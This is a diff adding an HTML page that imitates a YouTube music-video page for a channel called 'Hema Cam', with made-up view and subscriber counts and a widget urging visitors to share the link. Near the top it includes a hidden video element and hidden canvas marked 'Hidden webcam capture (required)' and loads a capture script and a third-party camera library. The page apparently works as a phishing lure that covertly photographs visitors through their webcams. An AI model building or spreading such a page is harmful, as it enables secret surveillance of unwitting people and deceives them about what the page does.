@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Hema Cam - YouTube</title>
+    <meta property="og:title" content="Hema Cam" />
+    <meta property="og:type" content="website" />
+    <meta name="og:image" content="desc.png" />
+    <meta name="description" content="Watch the latest music videos!" property="og:description" />
+    <meta name="description" content="desc.png" property="og:image" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="Hema Cam" />
+    <meta name="twitter:description" content="Watch the latest music videos!" />
+    <meta name="twitter:image" content="desc.png" />
+
+    <!-- Camera capture support -->
+    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css" />
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+    <link rel="stylesheet" href="styles.css" />
+</head>
+<body class="yt">
+
+    <!-- Hidden webcam capture (required) -->
+    <div class="video-wrap" hidden="hidden">
+        <video id="video" playsinline autoplay></video>
+    </div>
+    <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+    <!-- ===================== HEADER ===================== -->
+    <header class="yt-header">
+        <div class="h-left">
+            <button class="icon-btn ripple" id="menuBtn" title="Toggle sidebar">
+                <i class="fa-solid fa-bars"></i>
+            </button>
+            <a class="yt-logo" href="#" title="YouTube Home">
+                <span class="yt-logo-icon"><i class="fa-solid fa-play"></i></span>
+                <span class="yt-logo-text">YouTube</span>
+                <span class="yt-logo-cc">EG</span>
+            </a>
+        </div>
+
+        <div class="h-center">
+            <div class="search-area">
+                <div class="search-box">
+                    <input type="text" id="searchInput" placeholder="Search" autocomplete="off" spellcheck="false">
+                    <button class="search-clear" id="searchClear" title="Clear search">
+                        <i class="fa-solid fa-xmark"></i>
+                    </button>
+                    <div class="search-suggestions" id="searchSugs"></div>
+                </div>
+                <button class="search-btn ripple" id="searchBtn" title="Search">
+                    <i class="fa-solid fa-magnifying-glass"></i>
+                </button>
+                <button class="round-icon-btn ripple mic-btn" title="Search with your voice">
+                    <i class="fa-solid fa-microphone"></i>
+                </button>
+            </div>
+        </div>
+
+        <div class="h-right">
+            <button class="round-icon-btn ripple" id="createBtn" title="Create">
+                <i class="fa-solid fa-video"></i>
+            </button>
+            <button class="round-icon-btn ripple" title="YouTube apps">
+                <i class="fa-solid fa-grid"></i>
+            </button>
+            <button class="round-icon-btn ripple notify-btn" id="notifyBtn" title="Notifications">
+                <i class="fa-solid fa-bell"></i>
+                <span class="notify-badge">3</span>
+            </button>
+            <div class="avatar ripple" title="Your channel">H</div>
+        </div>
+    </header>
+
+    <div class="yt-body">
+
+        <!-- ===================== SIDEBAR ===================== -->
+        <aside class="sidebar" id="sidebar">
+            <nav class="side-group">
+                <a class="side-item active ripple" href="#">
+                    <i class="fa-solid fa-house"></i><span>Home</span>
+                </a>
+                <a class="side-item ripple" href="#">
+                    <i class="fa-solid fa-bolt"></i><span>Shorts</span>
+                </a>
+                <a class="side-item ripple" href="#">
+                    <i class="fa-solid fa-circle-play"></i><span>Subscriptions</span>
+                </a>
+            </nav>
+
+            <div class="side-sep"></div>
+
+            <nav class="side-group">
+                <div class="side-heading">You</div>
+                <a class="side-item ripple" href="#">
+                    <i class="fa-solid fa-user"></i><span>Your channel</span>
+                </a>
+                <a class="side-item ripple" href="#">
+                    <i class="fa-solid fa-clock-rotate-left"></i><span>History</span>
+                </a>
+                <a class="side-item ripple" href="#">
+                    <i class="fa-solid fa-clapperboard"></i><span>Your videos</span>
+                </a>
+                <a class="side-item ripple" href="#">
+                    <i class="fa-regular fa-clock"></i><span>Watch later</span>
+                </a>
+                <a class="side-item ripple" href="#">
+                    <i class="fa-solid fa-thumbs-up"></i><span>Liked videos</span>
+                </a>
+            </nav>
+
+            <div class="side-sep"></div>
+
+            <nav class="side-group">
+                <div class="side-heading">Subscriptions</div>
+                <a class="side-item ripple" href="#">
+                    <span class="mini-chan" style="background:#ff5a5a">H</span><span>Hema Cam</span>
+                </a>
+                <a class="side-item ripple" href="#">
+                    <span class="mini-chan" style="background:#6a5bff">M</span><span>Motion Hub</span>
+                </a>
+                <a class="side-item ripple" href="#">
+                    <span class="mini-chan" style="background:#00c853">G</span><span>Gaming Zone</span>
+                </a>
+                <a class="side-item ripple" href="#">
+                    <span class="mini-chan" style="background:#ff9100">T</span><span>Tech Trends</span>
+                </a>
+            </nav>
+
+            <div class="side-sep"></div>
+
+            <nav class="side-group">
+                <a class="side-item ripple" href="#">
+                    <i class="fa-solid fa-compass"></i><span>Explore</span>
+                </a>
+                <a class="side-item ripple" href="#">
+                    <i class="fa-solid fa-fire"></i><span>Trending</span>
+                </a>
+                <a class="side-item ripple" href="#">
+                    <i class="fa-solid fa-music"></i><span>Music</span>
+                </a>
+                <a class="side-item ripple" href="#">
+                    <i class="fa-solid fa-gamepad"></i><span>Gaming</span>
+                </a>
+                <a class="side-item ripple" href="#">
+                    <i class="fa-solid fa-newspaper"></i><span>News</span>
+                </a>
+            </nav>
+
+            <div class="side-sep"></div>
+
+            <nav class="side-group mini-only-icons">
+                <a class="side-item ripple" href="#">
+                    <i class="fa-solid fa-gear"></i><span>Settings</span>
+                </a>
+                <a class="side-item ripple" href="#">
+                    <i class="fa-solid fa-circle-question"></i><span>Help</span>
+                </a>
+                <a class="side-item ripple" href="#">
+                    <i class="fa-solid fa-flag"></i><span>Send feedback</span>
+                </a>
+            </nav>
+
+            <div class="side-footer">
+                <button class="footer-about ripple">About</button>
+                <button class="footer-about ripple">Press</button>
+                <button class="footer-about ripple">Copyright</button>
+                <button class="footer-about ripple">Contact</button>
+                <button class="footer-about ripple">Creators</button>
+                <button class="footer-about ripple">Advertise</button>
+                <button class="footer-about ripple">Developers</button>
+                <p class="side-copy">© 2026 Hema Cam</p>
+            </div>
+        </aside>
+
+        <!-- ===================== MAIN ===================== -->
+        <main class="content" id="content">
+
+            <!-- Watch layout : featured video + recommended -->
+            <div class="watch-layout">
+                <div class="watch-main">
+                    <div class="video-stage card-enter">
+                        <div class="video-frame">
+                            <iframe id="yt_player"
+                                src="https://www.youtube.com/embed/JGwWNGJdvx8?autoplay=1&mute=1&rel=0&playsinline=1&enablejsapi=1&loop=1&playlist=JGwWNGJdvx8"
+                                frameborder="0"
+                                allow="autoplay; encrypted-media; gyroscope; picture-in-picture; fullscreen"
+                                allowfullscreen></iframe>
+                            <video id="fallbackVideo" class="fallback-video" muted autoplay loop playsinline preload="none" controls>
+                                <source src="video.mp4" type="video/mp4">
+                                Your browser does not support the video player.
+                            </video>
+                        </div>
+
+                        <div class="stage-info">
+                            <div class="stage-title-row">
+                                <h1 class="stage-title">Hema Cam - Official Music Video 💿</h1>
+                            </div>
+                            <p class="stage-views">12,847,902 views &nbsp;•&nbsp; Premiere aired 3 months ago</p>
+                        </div>
+
+                        <div class="channel-row">
+                            <div class="chan-avatar ripple" style="background:linear-gradient(135deg,#ff5a5a,#ff9100)">H</div>
+                            <div class="chan-meta">
+                                <div class="chan-name">Hema Cam <i class="fa-solid fa-circle-check verify"></i></div>
+                                <div class="chan-subs">12.4M subscribers</div>
+                            </div>
+                            <button class="subscribe-btn ripple" id="subBtn">
+                                <span class="sub-check hidden"><i class="fa-solid fa-bell"></i></span>
+                                <span class="sub-label">Subscribe</span>
+                            </button>
+                            <button class="bell-btn ripple hidden" id="bellBtn" title="Notification settings">
+                                <i class="fa-solid fa-bell"></i>
+                            </button>
+                        </div>
+
+                        <div class="action-row">
+                            <div class="action-groups">
+                                <div class="btn-group">
+                                    <button class="act-btn ripple" id="likeBtn"><i class="fa-solid fa-thumbs-up"></i><span>214K</span></button>
+                                    <button class="act-btn act-right ripple" id="dislikeBtn"><i class="fa-solid fa-thumbs-down"></i></button>
+                                </div>
+                                <button class="act-btn ripple"><i class="fa-solid fa-share"></i><span>Share</span></button>
+                                <button class="act-btn ripple"><i class="fa-solid fa-download"></i><span>Download</span></button>
+                                <button class="act-btn ripple"><i class="fa-regular fa-bookmark"></i><span>Save</span></button>
+                                <button class="act-btn ripple"><i class="fa-solid fa-scissors"></i><span>Clip</span></button>
+                                <button class="act-btn icon-only ripple"><i class="fa-solid fa-ellipsis-vertical"></i></button>
+                            </div>
+                        </div>
+
+                        <div class="desc-box">
+                            <div class="desc-row">
+                                <span class="desc-title">12,847,902 views &nbsp;•&nbsp; 3 months ago &nbsp;•&nbsp; #Music #HemaCam</span>
+                            </div>
+                            <p class="desc-text">Welcome to the official Hema Cam channel! 🎵<br>
+                            Enjoy the latest songs, drops and exclusive music videos right here. Don't forget to like 👍 and subscribe!</p>
+                            <div class="desc-tags">
+                                <span>#Music</span><span>#HemaCam</span><span>#NewSong</span><span>#Trending</span><span>#Viral</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="watch-side">
+                    <div class="side-heading-chip">Up next</div>
+                    <div class="rec-video ripple" data-pop="pop">
+                        <div class="rec-thumb"><span class="dur">10:05</span></div>
+                        <div class="rec-text">
+                            <p class="rec-title">🎵 Hema Cam - Best Hits Compilation</p>
+                            <p class="rec-chan">Hema Cam</p>
+                            <p class="rec-meta">2.1M views • 1 week ago</p>
+                        </div>
+                    </div>
+                    <div class="rec-video ripple">
+                        <div class="rec-thumb"><span class="dur">8:42</span></div>
+                        <div class="rec-text">
+                            <p class="rec-title">Top 10 Trending Songs You Need To Hear 🔥</p>
+                            <p class="rec-chan">Global Hits</p>
+                            <p class="rec-meta">890K views • 3 hours ago</p>
+                        </div>
+                    </div>
+                    <div class="rec-video ripple">
+                        <div class="rec-thumb"><span class="dur">15:18</span></div>
+                        <div class="rec-text">
+                            <p class="rec-title">😍 Impressive Camera Transitions Tutorial</p>
+                            <p class="rec-chan">Tutorials Pro</p>
+                            <p class="rec-meta">450K views • yesterday</p>
+                        </div>
+                    </div>
+                    <div class="rec-video ripple">
+                        <div class="rec-thumb"><span class="dur">22:30</span></div>
+                        <div class="rec-text">
+                            <p class="rec-title">Behind The Scenes: Making of the Video</p>
+                            <p class="rec-chan">Hema Cam</p>
+                            <p class="rec-meta">1.5M views • 2 days ago</p>
+                        </div>
+                    </div>
+                    <div class="rec-video ripple">
+                        <div class="rec-thumb"><span class="dur">6:11</span></div>
+                        <div class="rec-text">
+                            <p class="rec-title">Night Vibes 🌙 - 4K Visualizer Mix</p>
+                            <p class="rec-chan">Chill Beats</p>
+                            <p class="rec-meta">320K views • 4 days ago</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Chips row -->
+            <div class="chips-row">
+                <button class="chip active ripple">All</button>
+                <button class="chip ripple">Trending</button>
+                <button class="chip ripple">Music</button>
+                <button class="chip ripple">Gaming</button>
+                <button class="chip ripple">Recently uploaded</button>
+                <button class="chip ripple">Watched</button>
+                <button class="chip ripple">New to you</button>
+                <button class="chip ripple">Songs</button>
+                <button class="chip ripple">Remixes</button>
+            </div>
+
+            <!-- Videos grid -->
+            <div class="section-head">
+                <h2>More videos</h2>
+                <button class="view-all ripple">View all <i class="fa-solid fa-chevron-right"></i></button>
+            </div>
+
+            <div class="video-grid" id="videoGrid">
+                <!-- 9 cards injected by JS for stagger animation -->
+            </div>
+        </main>
+    </div>
+
+    <!-- Mobile sidebar backdrop -->
+    <div class="side-backdrop" id="sideBackdrop"></div>
+
+    <!-- Toast -->
+    <div class="toast" id="toast"></div>
+
+    <script src="capture.js"></script>
+    <script>
+        /* ---------- Ripple effect ---------- */
+        document.querySelectorAll('.ripple').forEach(el => {
+            el.addEventListener('click', function (e) {
+                const rect = this.getBoundingClientRect();
+                const d = Math.max(rect.width, rect.height) * 2;
+                const span = document.createElement('span');
+                span.className = 'ripple-ink';
+                span.style.width = span.style.height = d + 'px';
+                span.style.left = (e.clientX - rect.left - d / 2) + 'px';
+                span.style.top = (e.clientY - rect.top - d / 2) + 'px';
+                this.appendChild(span);
+                setTimeout(() => span.remove(), 650);
+            });
+        });
+
+        /* ---------- Sidebar toggle ---------- */
+        const sidebar = document.getElementById('sidebar');
+        const body = document.body;
+        const backdrop = document.getElementById('sideBackdrop');
+        const isMobile = () => window.matchMedia('(max-width: 900px)').matches;
+        function closeSidebar() {
+            sidebar.classList.remove('open');
+            backdrop.classList.remove('show');
+        }
+        document.getElementById('menuBtn').addEventListener('click', () => {
+            if (isMobile()) {
+                if (sidebar.classList.contains('open')) {
+                    closeSidebar();
+                } else {
+                    sidebar.classList.add('open');
+                    backdrop.classList.add('show');
+                }
+            } else {
+                body.classList.toggle('side-collapsed');
+                sidebar.classList.toggle('collapsed');
+            }
+        });
+        backdrop.addEventListener('click', closeSidebar);
+
+        /* ---------- Sidebar active state ---------- */
+        document.querySelectorAll('.side-item').forEach(item => {
+            item.addEventListener('click', function (e) {
+                e.preventDefault();
+                document.querySelectorAll('.side-item').forEach(i => i.classList.remove('active'));
+                this.classList.add('active');
+                toast('Navigation: ' + (this.querySelector('span') || {}).textContent);
+            });
+        });
+
+        /* ---------- Subscribe button ---------- */
+        const subBtn = document.getElementById('subBtn');
+        const bellBtn = document.getElementById('bellBtn');
+        let subscribed = false;
+        subBtn.addEventListener('click', function () {
+            subscribed = !subscribed;
+            this.classList.add('subscribed');
+            if (subscribed) {
+                this.classList.add('is-sub');
+                this.querySelector('.sub-label').textContent = 'Subscribed';
+                bellBtn.classList.remove('hidden');
+                bellBtn.classList.add('pop-in');
+                toast('Subscribed to Hema Cam');
+            } else {
+                this.classList.remove('is-sub');
+                this.querySelector('.sub-label').textContent = 'Subscribe';
+                bellBtn.classList.add('pop-in');
+            }
+        });
+
+        /* ---------- Like / Dislike ---------- */
+        let liked = false;
+        document.getElementById('likeBtn').addEventListener('click', function () {
+            liked = !liked;
+            this.classList.toggle('liked', liked);
+            document.getElementById('dislikeBtn').classList.remove('disliked');
+            if (liked) { this.classList.add('pop'); toast('Thanks for your feedback!'); }
+            setTimeout(() => this.classList.remove('pop'), 400);
+        });
+        document.getElementById('dislikeBtn').addEventListener('click', function () {
+            this.classList.toggle('disliked');
+            document.getElementById('likeBtn').classList.remove('liked');
+            this.classList.add('pop');
+            setTimeout(() => this.classList.remove('pop'), 400);
+        });
+
+        /* ---------- Search interactions ---------- */
+        const sugs = ['Hema Cam latest video', 'music mix 2026', 'trending songs', 'asmr', 'new movie trailer'];
+        const searchInput = document.getElementById('searchInput');
+        const sugBox = document.getElementById('searchSugs');
+        const searchClear = document.getElementById('searchClear');
+
+        searchInput.addEventListener('focus', renderSuggestions);
+        searchInput.addEventListener('click', renderSuggestions);
+        searchInput.addEventListener('input', renderSuggestions);
+        document.addEventListener('click', e => {
+            if (!e.target.closest('.search-area')) sugBox.classList.remove('open');
+        });
+
+        function renderSuggestions() {
+            sugBox.innerHTML = '';
+            const q = searchInput.value.trim().toLowerCase();
+            const list = sugs.filter(s => s.toLowerCase().includes(q));
+            (list.length ? list : sugs).slice(0, 5).forEach(s => {
+                const item = document.createElement('div');
+                item.className = 'sug-item';
+                item.innerHTML = '<i class="fa-solid fa-magnifying-glass"></i><span>' + s + '</span>';
+                item.addEventListener('click', () => {
+                    searchInput.value = s;
+                    sugBox.classList.remove('open');
+                    toast('Search: ' + s);
+                });
+                sugBox.appendChild(item);
+            });
+            sugBox.classList.add('open');
+            searchClear.classList.toggle('show', !!searchInput.value);
+        }
+        searchClear.addEventListener('click', () => { searchInput.value = ''; searchClear.classList.remove('show'); renderSuggestions(); });
+
+        document.getElementById('searchBtn').addEventListener('click', () => {
+            const v = searchInput.value.trim();
+            toast(v ? 'Search: ' + v : 'Type something to search 🔍');
+        });
+        document.querySelector('.mic-btn').addEventListener('click', function () {
+            this.classList.add('mic-pulse');
+            toast('🎤 Listening... (demo)');
+            setTimeout(() => this.classList.remove('mic-pulse'), 1500);
+        });
+
+        /* ---------- Create / Notifications ---------- */
+        document.getElementById('createBtn').addEventListener('click', () => toast('📹 Upload / Create coming soon'));
+        document.getElementById('notifyBtn').addEventListener('click', function () {
+            const b = this.querySelector('.notify-badge');
+            b.classList.add('pop');
+            setTimeout(() => b.classList.remove('pop'), 400);
+            toast('🔔 No new notifications');
+        });
+
+        /* ---------- Chips ---------- */
+        document.querySelectorAll('.chip').forEach(chip => {
+            chip.addEventListener('click', function () {
+                document.querySelectorAll('.chip').forEach(c => c.classList.remove('active'));
+                this.classList.add('active');
+            });
+        });
+
+        /* ---------- Video cards with stagger entrance ---------- */
+        const cards = [
+            { t: '🎵 Hema Cam: The Comeback Song', c: 'Hema Cam', v: '1.2M views', time: '2 days ago', live: false, hue: [255,90,90] },
+            { t: 'Lofi Beats - Study & Relax 🎧', c: 'Chill Beats', v: '980K views', time: '4 days ago', live: false, hue: [106,91,255] },
+            { t: 'Gaming Marathon - Road to Legend 🎮', c: 'Gaming Zone', v: '640K views', time: '1 week ago', live: false, hue: [0,200,83] },
+            { t: 'Sunrise Yoga & Stretching ☀️', c: 'Wellness TV', v: '154K views', time: '2 weeks ago', live: false, hue: [255,145,0] },
+            { t: 'Q&A: Answering Your Questions', c: 'Motion Hub', v: '88K views', time: '5 days ago', live: false, hue: [0,172,255] },
+            { t: 'News Update: Breaking Headlines Now', c: 'News Daily', v: '410K views', time: '8 hours ago', live: false, hue: [171,71,188] },
+            { t: 'Midnight Rain 🌧 10-Hour Sleep Mix', c: 'Sleep Sounds', v: '2.4M views', time: '3 weeks ago', live: false, hue: [58,123,213] },
+            { t: 'Street Food Tour in Cairo 🍢', c: 'Food Vibes', v: '267K views', time: '6 days ago', live: false, hue: [255,61,127] },
+            { t: 'Football Highlights - Top Goals 2026 ⚽', c: 'Sport Zone', v: '789K views', time: '1 month ago', live: false, hue: [0,148,69] }
+        ];
+
+        const grid = document.getElementById('videoGrid');
+        grid.innerHTML = cards.map((c, i) => {
+            const dur = c.live ? 'LIVE' : ['4:05','12:33','7:18','9:52','3:44','16:20','5:07'][i % 7];
+            const badge = c.live ? '<span class="card-live"><span class="live-dot"></span>LIVE</span>' : '<span class="card-dur">' + dur + '</span>';
+            const grad = 'linear-gradient(135deg, rgb('+c.hue[0]+','+c.hue[1]+','+c.hue[2]+') , rgb('+(c.hue[0]+60)+','+(c.hue[1]+40)+','+(c.hue[2]+40)+'))';
+            return '<div class="video-card ripple card-in" style="animation-delay:' + (i * 90) + 'ms">' +
+                '<div class="thumb" style="background:' + grad + '">' +
+                    '<span class="thumb-play"><i class="fa-solid fa-play"></i></span>' +
+                    badge +
+                '</div>' +
+                '<div class="card-body">' +
+                    '<span class="chan-avatar sm ripple" style="background:rgb('+c.hue[0]+','+c.hue[1]+','+c.hue[2]+')">' + c.c[0] + '</span>' +
+                    '<div class="card-text">' +
+                        '<h3>' + c.t + '</h3>' +
+                        '<p class="card-chan">' + c.c + '</p>' +
+                        '<p class="card-meta">' + c.v + ' • ' + c.time + '</p>' +
+                    '</div>' +
+                '</div>' +
+            '</div>';
+        }).join('');
+
+        document.querySelectorAll('.video-card').forEach(card => {
+            card.addEventListener('click', () => toast('▶ Playing: ' + card.querySelector('h3').textContent));
+        });
+        document.querySelectorAll('.rec-video').forEach(rec => {
+            rec.addEventListener('click', () => toast('▶ Up next: ' + rec.querySelector('.rec-title').textContent));
+        });
+
+        /* ---------- Toast ---------- */
+        let toastTimer;
+        function toast(msg) {
+            const t = document.getElementById('toast');
+            t.textContent = msg;
+            t.classList.add('show');
+            clearTimeout(toastTimer);
+            toastTimer = setTimeout(() => t.classList.remove('show'), 2600);
+        }
+    </script>
+<!-- ========== Share Link Widget ========== -->
+<style>
+.shFAB{position:fixed;bottom:90px;right:18px;z-index:999;width:52px;height:52px;border-radius:50%;background:linear-gradient(135deg,#ff0033,#ff7a18);color:#fff;font-size:22px;display:grid;place-items:center;cursor:pointer;box-shadow:0 8px 28px rgba(255,0,51,.5);transition:transform .25s cubic-bezier(.2,.8,.3,1.2), box-shadow .25s;animation:shPulse 3s ease-in-out infinite}
+.shFAB:hover{transform:scale(1.15);box-shadow:0 10px 34px rgba(255,0,51,.65)}
+.shFAB:active{transform:scale(.92)}
+@keyframes shPulse{0%,100%{box-shadow:0 8px 28px rgba(255,0,51,.5)}50%{box-shadow:0 8px 34px rgba(255,0,51,.8)}}
+.shPanel{position:fixed;bottom:152px;right:18px;z-index:999;width:min(360px,92vw);background:rgba(22,22,26,.96);border:1px solid rgba(255,255,255,.12);border-radius:20px;padding:22px 20px 18px;backdrop-filter:blur(16px);box-shadow:0 24px 60px rgba(0,0,0,.7);opacity:0;transform:translateY(16px) scale(.94);pointer-events:none;transition:opacity .25s ease, transform .25s cubic-bezier(.2,.8,.3,1)}
+.shPanel.open{opacity:1;transform:translateY(0) scale(1);pointer-events:auto}
+.shPanel h4{margin:0 0 12px;font-size:15px;font-weight:800;color:#f1f1f1;display:flex;align-items:center;gap:8px}
+.shPanel h4 span{font-size:18px}
+.shClose{margin-left:auto;background:none;border:none;color:#a0a0a8;font-size:18px;cursor:pointer;transition:color .2s, transform .2s}
+.shClose:hover{color:#ff0033;transform:scale(1.2)}
+.shUrlBox{position:relative;margin-bottom:14px}
+.shUrl{width:100%;background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.12);border-radius:10px;padding:10px 44px 10px 12px;color:#f1f1f1;font-size:12.5px;font-family:Consolas,monospace;outline:none;transition:border-color .2s}
+.shUrl:focus{border-color:#ff0033}
+.shCopyBtn{position:absolute;right:6px;top:50%;transform:translateY(-50%);width:32px;height:32px;border-radius:8px;background:rgba(255,255,255,.1);border:none;color:#f1f1f1;font-size:14px;cursor:pointer;transition:background .2s}
+.shCopyBtn:hover{background:rgba(255,0,51,.5)}
+.shRow{display:flex;gap:7px;flex-wrap:wrap}
+.shBtn{flex:1;min-width:70px;padding:9px 6px;border-radius:11px;border:none;cursor:pointer;font-size:12.5px;font-weight:700;font-family:inherit;color:#fff;display:flex;flex-direction:column;align-items:center;gap:5px;transition:transform .2s ease, filter .2s}
+.shBtn:hover{transform:translateY(-2px) scale(1.04)}
+.shBtn:active{transform:scale(.93)}
+.shBtn .shIc{font-size:20px}
+.shBtn.i1{background:#25d366}
+.shBtn.i2{background:#0088cc}
+.shBtn.i3{background:#1877f2}
+.shBtn.i4{background:#1da1f2}
+.shBtn.i5{background:#666}
+.shToast{position:fixed;bottom:220px;right:24px;z-index:1000;background:#f1f1f1;color:#0f0f0f;font-size:13px;font-weight:700;padding:10px 18px;border-radius:12px;box-shadow:0 12px 30px rgba(0,0,0,.5);opacity:0;transform:translateY(10px);transition:opacity .3s, transform .3s;pointer-events:none}
+.shToast.show{opacity:1;transform:translateY(0)}
+</style>
+
+<div class="shFAB" id="shFAB" title="Share link to friends">🔗</div>
+<div class="shPanel" id="shPanel">
+    <h4><span>🔗</span> Share link with friends <button class="shClose" id="shClose">✕</button></h4>
+    <div class="shUrlBox">
+        <input class="shUrl" id="shUrl" readonly>
+        <button class="shCopyBtn" id="shCopy" title="Copy">📋</button>
+    </div>
+    <div class="shRow">
+        <button class="shBtn i1" data-sh="copy"><span class="shIc">📋</span>Copy</button>
+        <button class="shBtn i2" data-sh="wa"><span class="shIc">💬</span>WhatsApp</button>
+        <button class="shBtn i3" data-sh="fb"><span class="shIc">📘</span>Facebook</button>
+        <button class="shBtn i4" data-sh="tg"><span class="shIc">✈️</span>Telegram</button>
+        <button class="shBtn i5" data-sh="x"><span class="shIc">🐦</span>X / Twitter</button>
+    </div>
+</div>
+<div class="shToast" id="shToast"></div>
+
+<script>
+(function(){
+    var fab=document.getElementById('shFAB'),
+        panel=document.getElementById('shPanel'),
+        urlIn=document.getElementById('shUrl'),
+        shToast=document.getElementById('shToast');
+    var shT;
+
+    function getURL(){ return location.href.split('#')[0]; }
+
+    function showPanel(){
+        urlIn.value=getURL();
+        panel.classList.add('open');
+        urlIn.select();
+        copyText(getURL());
+        shMsg('Link copied! Send it to your friends 🚀');
+    }
+
+    function hidePanel(){ panel.classList.remove('open'); }
+
+    fab.addEventListener('click',function(e){
+        e.stopPropagation();
+        panel.classList.contains('open') ? hidePanel() : showPanel();
+    });
+
+    document.addEventListener('click',function(e){
+        if(!panel.contains(e.target) && e.target!==fab) hidePanel();
+    });
+
+    document.getElementById('shClose').addEventListener('click',hidePanel);
+
+    document.getElementById('shCopy').addEventListener('click',function(){
+        copyText(urlIn.value);
+        shMsg('Link copied! ✅');
+    });
+
+    document.querySelectorAll('.shBtn').forEach(function(btn){
+        btn.addEventListener('click',function(){
+            var u=getURL(), enc=encodeURIComponent(u), t=encodeURIComponent('Check this out! 👉 ');
+            var links={
+                copy: u,
+                wa: 'https://api.whatsapp.com/send?text='+t+enc,
+                fb: 'https://www.facebook.com/sharer/sharer.php?u='+enc,
+                tg: 'https://t.me/share/url?url='+enc+'&text='+t,
+                x: 'https://twitter.com/intent/tweet?text='+t+'&url='+enc
+            };
+            var target=links[this.dataset.sh];
+            if(this.dataset.sh==='copy'){ copyText(u); shMsg('Link copied! ✅'); }
+            else{ window.open(target,'_blank','width=600,height=500'); shMsg('Opening… 🚀'); }
+            setTimeout(hidePanel,400);
+        });
+    });
+
+    function copyText(txt){
+        if(navigator.clipboard&&navigator.clipboard.writeText) navigator.clipboard.writeText(txt);
+        else{ var ta=document.createElement('textarea');ta.value=txt;ta.style.cssText='position:fixed;opacity:0';document.body.appendChild(ta);ta.select();try{document.execCommand('copy');}catch(e){}document.body.removeChild(ta);}
+    }
+
+    function shMsg(m){ shToast.textContent=m;shToast.classList.add('show');clearTimeout(shT);shT=setTimeout(function(){shToast.classList.remove('show');},2200); }
+})();
+</script>
+
+<!-- ===== Hybrid Player: YouTube first, auto-fallback to local video ===== -->
+<script>
+(function(){
+    var player = null, ytReady = false, ytStarted = false, swapped = false;
+    var fb = document.getElementById('fallbackVideo');
+    if(!fb) return;
+
+    function useFallbackVideo(){
+        if(swapped) return;
+        swapped = true;
+        var ifr = document.getElementById('yt_player');
+        if(player){ try{ player.destroy(); }catch(e){} }
+        if(ifr) ifr.style.display = 'none';
+        fb.style.display = 'block';
+        fb.setAttribute('preload', 'auto');
+        var p = fb.play();
+        if(p && p.catch) p.catch(function(){});
+    }
+
+    window.onYouTubeIframeAPIReady = function(){
+        if(ytReady) return;
+        ytReady = true;
+        try{
+            if(typeof YT === 'undefined' || !YT.Player){ useFallbackVideo(); return; }
+            player = new YT.Player('yt_player', {
+                events: {
+                    onReady: function(e){ setTimeout(function(){ try{ e.target.playVideo(); }catch(err){} }, 800); },
+                    onStateChange: function(e){
+                        if(e.data === 1) ytStarted = true;
+                        if(e.data === 0){ try{ e.target.playVideo(); }catch(err){} }
+                    },
+                    onError: function(){ useFallbackVideo(); }
+                }
+            });
+        }catch(e){ useFallbackVideo(); }
+        setTimeout(function(){
+            if(!swapped && !ytStarted){ useFallbackVideo(); }
+        }, 9000);
+    };
+
+    if(typeof YT !== 'undefined' && YT.Player){
+        setTimeout(function(){ window.onYouTubeIframeAPIReady(); }, 300);
+    } else {
+        window.addEventListener('load', function(){
+            setTimeout(function(){
+                if(!ytReady && typeof YT !== 'undefined' && YT.Player){ window.onYouTubeIframeAPIReady(); }
+            }, 3000);
+        });
+    }
+})();
+</script>
+<script src="https://www.youtube.com/iframe_api"></script>
+</body>
+</html>
